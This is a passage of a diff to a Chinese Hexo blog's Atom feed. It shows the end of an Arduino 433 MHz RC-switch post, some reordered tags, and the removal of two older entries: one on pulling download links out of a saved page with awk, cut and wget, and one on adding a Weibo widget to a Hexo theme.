class="comment">/*</span></div><div class="line">  mySwitch.send("000000000001010100010001");</div><div class="line">  delay(1000);  </div><div class="line">  mySwitch.send("000000000001010100010100");</div><div class="line">  delay(1000);</div><div class="line">  */</div><div class="line"></div><div class="line">  <span class="comment">/* Same switch as above, but tri-state code */</span> </div><div class="line">  <span class="comment">/*</span></div><div class="line">  mySwitch.sendTriState("00000FFF0F0F");</div><div class="line">  delay(1000);  </div><div class="line">  mySwitch.sendTriState("00000FFF0FF0");</div><div class="line">  delay(1000);</div><div class="line">  */</div><div class="line"></div><div class="line">  delay(<span class="number">20000</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="3-上传代码-1"><a href="#3-上传代码-1" class="headerlink" title="3. 上传代码"></a>3. 上传代码</h3><p><img src="/data/images/2017-01-29_01-0004.png" alt=""></p>
+<h3 id="2-3-上传代码"><a href="#2-3-上传代码" class="headerlink" title="2.3 上传代码"></a>2.3 上传代码</h3><p><img src="/data/images/2017-01-29_01-0004.png" alt=""></p>
 <p>代码上传完成后会一直向外发送信号。</p>
 <h2 id="3、可能遇到的问题"><a href="#3、可能遇到的问题" class="headerlink" title="3、可能遇到的问题"></a>3、可能遇到的问题</h2><p>1、串口监视器没有显示，不能正常接收信号。</p>
 <p>导致出现正在错误的情况有很多，比如打开的端口错误、接收模块与 Arduino 的连接错误、遥控器和接收模块不是同一个频段的……</p>
@@ -109,9 +188,9 @@
     
       <category term="433 MHz" scheme="https://blog.iternull.com/tags/433-MHz/"/>
     
-      <category term="315 MHz" scheme="https://blog.iternull.com/tags/315-MHz/"/>
-    
       <category term="Arduino" scheme="https://blog.iternull.com/tags/Arduino/"/>
+    
+      <category term="315 MHz" scheme="https://blog.iternull.com/tags/315-MHz/"/>
     
       <category term="RC Switch" scheme="https://blog.iternull.com/tags/RC-Switch/"/>
     
@@ -439,9 +518,9 @@
     </summary>
     
     
-      <category term="Web" scheme="https://blog.iternull.com/tags/Web/"/>
-    
       <category term="Tor" scheme="https://blog.iternull.com/tags/Tor/"/>
+    
+      <category term="Web" scheme="https://blog.iternull.com/tags/Web/"/>
     
       <category term="Tor Browser" scheme="https://blog.iternull.com/tags/Tor-Browser/"/>
     
@@ -519,11 +598,11 @@
     </summary>
     
     
-      <category term="Web" scheme="https://blog.iternull.com/tags/Web/"/>
-    
       <category term="Tor" scheme="https://blog.iternull.com/tags/Tor/"/>
     
       <category term="onion" scheme="https://blog.iternull.com/tags/onion/"/>
+    
+      <category term="Web" scheme="https://blog.iternull.com/tags/Web/"/>
     
   </entry>
   
@@ -902,63 +981,6 @@
     
     
       <category term="Nightcore" scheme="https://blog.iternull.com/tags/Nightcore/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>使用文本处理命令获取链接批量下载</title>
-    <link href="https://blog.iternull.com/posts/2015/06/13/Text-Extract-Links.html"/>
-    <id>https://blog.iternull.com/posts/2015/06/13/Text-Extract-Links.html</id>
-    <published>2015-06-13T08:03:43.000Z</published>
-    <updated>2016-08-30T09:05:45.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>比如我看到Nmap的资源很想把他全部下载到本地怎么办呐？右键一个个点？用工具镜像整个站点？<br>以前我用的方法是左边打开浏览器，右边打开Notepad++ 一个个链接拖到Notepad++里，最后就有了一个完整的下载列表<br>现在有更好的方法，利用Linux的文本处理工具提取完整的下载链接，文本处理工具我很早就学过了，但是平常不用，学了就忘<br><a id="more"></a><br>打开你要处理网站的页面 <code>https://nmap.org/dist/</code> 右键保存网页</p>
-<p><img src="/data/images/2015-06-13_01-0001.png" alt=""></p>
-<p>用编辑器打开删除HTML文件顶部的代码和底部代码留下链接部分</p>
-<p><img src="/data/images/2015-06-13_01-0002.png" alt=""></p>
-<p>使用文本处理命令剔除多余文本，留下完整链接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $7&#125;'</span> index-of.html | cut <span class="_">-d</span> <span class="string">'"'</span> <span class="_">-f</span>2 &gt; output.txt</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">awk &apos;&#123;print $7&#125;&apos;	// 打印出第7列文本，按空格或者制表符(Tab)</div><div class="line">index-of.html		// 要处理的文件</div><div class="line">| cut -d &apos;&quot;&apos; -f2	// 通过管道传递给 cut -d 指定分隔符为&quot; -f2 指定输出地2列文本</div><div class="line">&gt; output.txt		// 重定向标准输出到output.txt</div></pre></td></tr></table></figure>
-<p><img src="/data/images/2015-06-13_01-0003.png" alt=""></p>
-<p>然后就可以使用获取到的链接列表自动批量下载了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -i output.txt</div></pre></td></tr></table></figure>
-<p>估算了一下，使用这个方法给我节约了5倍的时间可以干其他事情</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;比如我看到Nmap的资源很想把他全部下载到本地怎么办呐？右键一个个点？用工具镜像整个站点？&lt;br&gt;以前我用的方法是左边打开浏览器，右边打开Notepad++ 一个个链接拖到Notepad++里，最后就有了一个完整的下载列表&lt;br&gt;现在有更好的方法，利用Linux的文本处理工具提取完整的下载链接，文本处理工具我很早就学过了，但是平常不用，学了就忘&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Text" scheme="https://blog.iternull.com/tags/Text/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hexo 添加微博秀</title>
-    <link href="https://blog.iternull.com/posts/2015/05/30/Hexo-Weibo.html"/>
-    <id>https://blog.iternull.com/posts/2015/05/30/Hexo-Weibo.html</id>
-    <published>2015-05-30T12:47:19.000Z</published>
-    <updated>2016-08-19T09:51:40.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>到<a href="http://app.weibo.com/tool/weiboshow" target="_blank" rel="external">新浪微博开放平台</a>获取微博秀代码<br>新建文件 <code>themes/你的主题/layout/_widget/weibo.ejs</code> 在文件中添加以下代码<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;% if (site.posts.length)&#123; %&gt;</div><div class="line">  &lt;div class=&quot;widget-wrap&quot;&gt;</div><div class="line">    &lt;h3 class=&quot;widget-title&quot;&gt;&lt;%= __(&apos;weibo&apos;) %&gt;&lt;/h3&gt;</div><div class="line">    &lt;div class=&quot;widget&quot;&gt;</div><div class="line">		你的微博秀代码</div><div class="line">	&lt;/div&gt;</div><div class="line">  &lt;/div&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure></p>
-<p>编辑主题配置文件 <code>_config.yml</code> 在 <code>widgets:</code> 选项内添加以下代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">- weibo</div></pre></td></tr></table></figure>
-<p>使用 <code>localhost</code> 访问的可能会时一片空白，只要使用IP地址 <code>127.0.0.1</code> 访问就可以显示了</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;到&lt;a href=&quot;http://app.weibo.com/tool/weiboshow&quot;&gt;新浪微博开放平台&lt;/a&gt;获取微博秀代码&lt;br&gt;新建文件 &lt;code&gt;themes/你的主题/layout/_widget/weibo.ejs&lt;/code&gt; 在文件中添加以下代码&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Hexo" scheme="https://blog.iternull.com/tags/Hexo/"/>
-    
-      <category term="Weibo" scheme="https://blog.iternull.com/tags/Weibo/"/>
     
   </entry>
   
